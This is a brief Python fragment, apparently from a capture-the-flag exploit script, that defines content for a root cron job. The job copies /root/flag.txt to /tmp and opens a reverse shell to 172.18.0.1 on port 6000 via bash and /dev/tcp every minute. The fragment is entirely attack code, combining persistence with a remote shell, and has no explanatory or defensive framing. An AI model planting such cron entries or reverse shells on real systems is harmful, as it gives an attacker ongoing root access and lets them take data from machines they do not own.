...
# Content for the malicious cronjob, now including a reverse shell to 172.18.0.1:6000
cron_content = '* * * * * root /bin/bash -c "cat /root/flag.txt > /tmp/flag.txt; bash -i >& /dev/tcp/172.18.0.1/6000 0>&1"\n'
